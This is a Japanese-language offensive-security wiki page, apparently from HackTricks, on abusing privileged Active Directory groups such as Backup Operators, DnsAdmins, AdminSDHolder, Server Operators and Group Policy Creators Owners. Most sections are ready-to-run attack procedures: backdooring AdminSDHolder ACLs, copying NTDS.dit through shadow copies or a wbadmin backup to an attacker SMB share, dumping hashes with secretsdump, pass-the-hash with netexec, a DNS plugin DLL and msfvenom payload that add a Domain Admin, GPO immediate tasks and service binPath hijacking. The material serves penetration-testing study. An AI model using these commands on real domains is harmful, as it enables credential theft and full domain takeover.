# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つ既知のグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループには、ドメイン上で管理者ではないアカウントとグループを作成する権限があります。さらに、Domain Controller（DC）へのローカルログインが可能になります。

このグループのメンバーを特定するには、次のコマンドを実行します：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加が許可されており、DC へのローカルログインも許可されています。<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** group の Access Control List (ACL) は、high-privilege groups を含む Active Directory 内のすべての「protected groups」に対する権限を設定するため、非常に重要です。このメカニズムにより、不正な変更を防止し、これらの groups の security が確保されます。

attacker は **AdminSDHolder** group の ACL を変更し、standard user にフル権限を付与することで、これを悪用できます。これにより、その user はすべての protected groups を完全に制御できるようになります。この user の permissions が変更または削除された場合でも、system の設計により1時間以内に自動的に再付与されます。<sup>[[14]](#references)</sup>

Recent Windows Server documentation では、複数の built-in operator groups が現在も **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` など) として扱われています。**SDProp** process はデフォルトで60分ごとに **PDC Emulator** 上で実行され、`adminCount=1` を設定し、protected objects の inheritance を無効化します。これは persistence にも、protected group から削除されたにもかかわらず、non-inheriting ACL を保持している stale privileged users の hunting にも有用です。<sup>[[12]](#references)</sup>

members の確認と permissions の変更に使用する commands は次のとおりです。
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
復元プロセスを迅速化するスクリプトが利用できます: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳細については、[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) を参照してください。<sup>[[14]](#references)</sup>

## AD Recycle Bin

このグループのメンバーになると、削除された Active Directory オブジェクトを読み取れるようになり、機密情報が明らかになる可能性があります:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
これは、**過去の権限経路を復元する**のに役立ちます。削除されたオブジェクトにも、`lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古い SPN、または後から別のオペレーターによって復元される可能性がある、削除された特権グループの DN が残っている場合があります。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### ドメインコントローラーへのアクセス

DC上のファイルへのアクセスは、ユーザーが `Server Operators` グループに所属していない限り制限されます。このグループに所属すると、アクセスレベルが変わります。

### 権限昇格

Sysinternalsの `PsService` または `sc` を使用すると、サービスの権限を調査および変更できます。たとえば、`Server Operators` グループは特定のサービスを完全に制御できるため、任意のコマンドを実行して権限昇格できます。<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドにより、`Server Operators` が完全なアクセス権を持ち、昇格した権限を得るためにサービスを操作できることが明らかになります。

## Backup Operators

`Backup Operators` グループのメンバーになると、`SeBackup` および `SeRestore` 権限により、`DC01` のファイルシステムにアクセスできます。これらの権限により、明示的なアクセス許可がなくても、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用して、フォルダーの移動、一覧表示、ファイルのコピーが可能になります。このプロセスには特定のスクリプトを使用する必要があります。<sup>[[1]](#references)</sup>

グループメンバーを一覧表示するには、次を実行します。
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### ローカル攻撃

これらの権限をローカルで利用するには、次の手順を実行します。

1. 必要なライブラリをインポートします:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` を有効化して確認する:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリからファイルにアクセスしてコピーする。例えば:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller のファイルシステムへ直接アクセスできると、ドメインユーザーとコンピューターのすべての NTLM ハッシュを含む `NTDS.dit` データベースを盗み出せます。

#### diskshadow.exe の使用

1. `C` ドライブのシャドウコピーを作成します:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーします:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
または、ファイルのコピーには `robocopy` を使用します。
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. ハッシュ取得のために `SYSTEM` と `SAM` を抽出:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` からすべての hash を取得:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-extraction: Pass-the-Hash to DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe の使用

1. 攻撃者のマシン上で SMB server 用の NTFS filesystem をセットアップし、target machine 上で SMB credentials を cache します。
2. `wbadmin.exe` を使用して system backup と `NTDS.dit` extraction を実行します。
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

実践的なデモについては、[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) を参照してください。

## DnsAdmins

**DnsAdmins** group のメンバーは、その privileges を悪用して、DNS server 上で SYSTEM privileges により任意の DLL を load できます。DNS server は多くの場合 Domain Controllers 上で host されているため、この機能には大きな exploitation potential があります。

DnsAdmins group のメンバーを一覧表示するには、次を使用します：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意の DLL を実行する (CVE‑2021‑40469)

> [!NOTE]
> この脆弱性により、DNS service（通常は DCs 内）で SYSTEM privileges による任意の code の実行が可能になります。この問題は 2021 年に修正されました。

Members は、次のような commands を使用して、DNS server に任意の DLL（ローカルまたは remote share から）を load させることができます：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL をロードするには、DNS サービスの再起動（追加の権限が必要になる場合があります）が必要です。
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この attack vector の詳細については、ired.team を参照してください。

#### Mimilib.dll

command execution のために mimilib.dll を使用し、特定のコマンドや reverse shells を実行するよう変更することも可能です。詳細については、[この投稿](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)を確認してください。<sup>[[15]](#references)</sup>

### MitM 用の WPAD レコード

DnsAdmins は、global query block list を無効化した後に WPAD レコードを作成することで、Man-in-the-Middle (MitM) 攻撃を実行するための DNS レコードを操作できます。Responder や Inveigh などのツールを使用して、ネットワークトラフィックの spoofing とキャプチャを実行できます。

### Event Log Readers
メンバーはイベントログにアクセスできるため、平文パスワードや command execution の詳細など、機密情報を発見できる可能性があります。
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループはドメインオブジェクトの DACL を変更できるため、DCSync 権限を付与できる可能性があります。このグループを悪用した privilege escalation の手法については、Exchange-AD-Privesc GitHub repo で詳しく説明されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
このグループのメンバーとして行動できる場合、典型的な悪用方法は、攻撃者が制御するプリンシパルに [DCSync](dcsync.md) に必要なレプリケーション権限を付与することです:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** は mailbox access、coerced Exchange authentication、LDAP relay を連鎖させ、この同じ primitive に到達していました。この relay path が緩和されている場合でも、`Exchange Windows Permissions` への直接的な membership や Exchange server の control は、domain replication rights に至る高価値な経路として残ります。

## Hyper-V Administrators

Hyper-V Administrators は Hyper-V に対する完全な access を持っており、これを悪用して virtualized Domain Controllers を制御できます。これには、稼働中の DC の cloning や、NTDS.dit file からの NTLM hashes の抽出が含まれます。

### Exploitation Example

実際の abuse では、以前の host-level LPE tricks よりも、通常は **DC disks/checkpoints への offline access** が使われます。Hyper-V host への access があれば、operator は virtualized Domain Controller の checkpoint または export を作成し、VHDX を mount して、guest 内部の LSASS に触れることなく `NTDS.dit`、`SYSTEM`、その他の secrets を抽出できます：
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
そこから、`Backup Operators` workflow を再利用して、`Windows\NTDS\ntds.dit` と registry hives をオフラインでコピーします。関連する backup-file workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

この group に所属するメンバーは、ドメイン内で Group Policies を作成できます。ただし、そのメンバーはユーザーや group に group policies を適用したり、既存の GPOs を編集したりすることはできません。

重要な点は、**creator が新しい GPO の owner になり、通常はその後の編集に必要な十分な権限を得る**ことです。つまり、次のいずれかが可能な場合、この group は興味深い対象になります。

- malicious GPO を作成し、admin に対象の OU/domain へ link させる
- すでに有用な場所へ link されている、自分が作成した GPO を編集する
- GPOs を link できる別の delegated right を abuse し、この group によって編集側の権限を得る

実際の abuse では通常、SYSVOL-backed policy files を通じて、**Immediate Task**、**startup script**、**local admin membership**、または **user rights assignment** の変更を追加します。<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL` を通じて GPO を手動で編集する場合、変更だけでは不十分であることに注意してください。`versionNumber`、`GPT.ini`、そして場合によっては `gPCMachineExtensionNames` も更新する必要があります。更新しないと、client は policy refresh を無視します。<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange** が展開されている環境では、**Organization Management** と呼ばれる特別な group が重要な機能を保持しています。この group には、**すべての domain user の mailbox にアクセスする**権限があり、さらに **'Microsoft Exchange Security Groups'** Organizational Unit (OU) を**完全に制御**できます。この制御には **`Exchange Windows Permissions`** group も含まれており、privilege escalation に悪用できます。

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** group のメンバーには、**`SeLoadDriverPrivilege`** などの複数の privilege が付与されています。この privilege により、**Domain Controller に local logon** し、シャットダウンや printer の管理を行えます。これらの privilege を exploit するには、特に **`SeLoadDriverPrivilege`** が unelevated context では表示されない場合、User Account Control (UAC) の bypass が必要です。<sup>[[1]](#references)</sup>

この group のメンバーを一覧表示するには、次の PowerShell command を使用します：
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
ドメインコントローラーでは、既定の Domain Controller Policy により **`SeLoadDriverPrivilege`** が `Print Operators` に付与されるため、このグループは危険です。このグループのメンバーの elevated token を取得できれば、権限を有効化し、署名済みだが脆弱な driver をロードして kernel/SYSTEM へ移行できます。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> token の処理の詳細については、[Access Tokens](../windows-local-privilege-escalation/access-tokens.md) を参照してください。

#### Remote Desktop Users

このグループのメンバーには、Remote Desktop Protocol (RDP) 経由で PC へのアクセス権が付与されます。これらのメンバーを列挙するには、PowerShell commands を利用できます：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Further insights into exploiting RDP can be found in dedicated pentesting resources.

#### Remote Management Users

メンバーは **Windows Remote Management (WinRM)** を介してPCにアクセスできます。これらのメンバーの列挙は、以下によって実行できます：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
WinRM に関連する exploitation techniques については、specific documentation を参照してください。

#### Server Operators

このグループには、バックアップおよび復元の privileges、システム時刻の変更、システムのシャットダウンなど、Domain Controllers 上でさまざまな設定を実行する permissions があります。<sup>[[1]](#references)</sup> メンバーを enumerate するには、次の command を実行します。
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
ドメインコントローラーでは、`Server Operators` は通常、**サービスを再構成または開始・停止する権限**を十分に継承しており、デフォルトの DC ポリシーを通じて `SeBackupPrivilege`/`SeRestorePrivilege` も付与されます。実際には、これにより **service-control abuse** と **NTDS extraction** の橋渡し役となります：
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
このグループにサービスの変更・開始権限を与える service ACL がある場合は、サービスを任意のコマンドを指すように設定し、`LocalSystem` として起動してから、元の `binPath` を復元します。サービス制御が制限されている場合は、上記の `Backup Operators` の techniques に切り替えて `NTDS.dit` をコピーします。

## References

- [1] [ired.team – 特権アカウントと Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation のための SeLoadDriverPrivilege の悪用](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO Permissions の悪用](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse、第1部 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO と OU に関する Red Teamer's Guide](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 付録 C: Active Directory の Protected Accounts と Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – AdminSDHolder を悪用および backdoor して Domain Admin Persistence を取得する方法](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory における DnsAdmins Privilege の悪用による Escalation](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll edge abuse information](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver function (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
